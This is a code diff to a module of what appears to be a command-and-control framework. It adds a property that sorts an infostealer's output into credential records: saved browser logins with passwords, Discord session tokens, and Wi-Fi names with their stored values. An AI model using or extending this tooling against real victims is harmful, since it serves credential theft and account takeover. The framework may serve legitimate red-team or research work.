@@ -6,11 +6,13 @@ This is the Python native version.
 
 from typing import Any, Optional, Type
 import logging
+import re
 import sys
 
-from pydantic import BaseModel, Field
+from pydantic import BaseModel, Field, computed_field
 
 from deaddrop_meta.command_lib import CommandBase, RendererBase
+from deaddrop_meta.protocol_lib import Credential
 
 # Conditional imports. Makes mypy slightly less angry.
 if sys.platform == "win32":
@@ -78,6 +80,49 @@ class EmpyreanResult(BaseModel):
             )
         },
     )
+
+    # mypy doesn't support decorated properties, though this is the official
+    # method described in pydantic's documentation
+    @computed_field  # type: ignore[misc]
+    @property
+    def _credentials(self) -> list[Credential]:
+        """
+        Generate the standardized file output list.
+        """
+        if not self.success:
+            return []
+
+        result: list[Credential] = []
+        # Pull out any browser data, if it exists
+        for _browser_name, browser_dict in self.browser_output.items():
+            for _profile_name, profile_dict in browser_dict.items():
+                for login in profile_dict["logins"]:
+                    cred = Credential(
+                        credential_type="browser_login",
+                        value=f"{login['url']}:{login['username']}:{login['password']}",
+                    )
+                    result.append(cred)
+
+        # Now pull extracted discord session tokens
+        for token, token_dict in self.discord_output.items():
+            cred = Credential(
+                credential_type="discord_token",
+                value=f"{token_dict['username']}:{token}",
+            )
+            result.append(cred)
+
+        try:
+            wifi_str = self.sysinfo_output["system_info"]["wifi_data"]["wifi_info"]
+            for line in wifi_str.split("\n")[2:]:
+                if m := re.search(r"^(.*?)\s*\|\s*(.*)$", line):
+                    cred = Credential(
+                        credential_type="wifi_info", value=f"{m.group(1)}:{m.group(2)}"
+                    )
+                    result.append(cred)
+        except Exception as e:
+            logger.error(f"Extracting Wi-Fi info failed: {e}")
+
+        return result
 
 
 class EmpyreanCommand(CommandBase):
